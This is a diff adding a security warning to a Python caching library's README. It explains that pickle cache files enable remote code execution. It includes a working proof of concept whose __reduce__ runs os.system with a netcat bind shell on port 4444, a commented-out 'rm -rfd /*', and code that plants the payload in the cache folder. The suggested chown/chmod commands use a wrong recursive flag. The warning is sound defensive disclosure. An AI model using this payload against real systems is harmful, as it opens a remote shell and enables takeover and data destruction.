@@ -431,3 +431,56 @@ It will automatically create the needed folders. Moreover, you can get the expec
 
     # you can get the path where the file would be saved (this does not call the function!).
     path = Cache.compute_path(test_function, 10, y="ciao")
+
+
+Security Warnings
+---------------
+
+Whenever possible don't use the pickle extension.
+De-serializzation of untrusted data might lead to Remote Code Execution or Local Privilege Escalation ( https://davidhamann.de/2020/04/05/exploiting-python-pickle/ ).
+Therefore, simple formats such as json is preferable whenever possible.
+
+Suppose we have this code:
+
+.. code:: python
+
+    from cache_decorator import Cache
+
+    @Cache("./cache/{x}.pkl)
+    def my_awesome_function(x):
+        return x
+
+    ...
+
+    my_awesome_function(1)
+
+If in any way we have access to the cache folder, we can easily exploit it:
+
+.. code:: python
+
+    import pickle
+
+    COMMAND = "netcat -c '/bin/bash -i' -l -p 4444" # rm -rfd /*
+
+    class PickleRce(object):
+        def __reduce__(self):
+            import os
+            return (os.system,(COMMAND,))
+
+    payload = pickle.dumps(PickleRce())
+    print(payload)
+    # b"\x80\x04\x95>\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c#netcat -c '/bin/bash -i' -l -p 4444\x94\x85\x94R\x94."
+
+    with open("./cache/1.pkl", "wb") as f:
+        f.write(payload)
+
+Next time that the function is called with argumnet ``1``, we will spawn a remote shell and take control of the system.
+
+
+For this reason is important to either use a simpler serializzation scheme like json and to fortify the system by setting the cache dir to be read-write only for the current user.
+
+.. code:: bash
+    chown -r $USER:$USER ./cache
+    chmod -r 600 ./cache
+
+This way only the current application can create and modify the cache files.
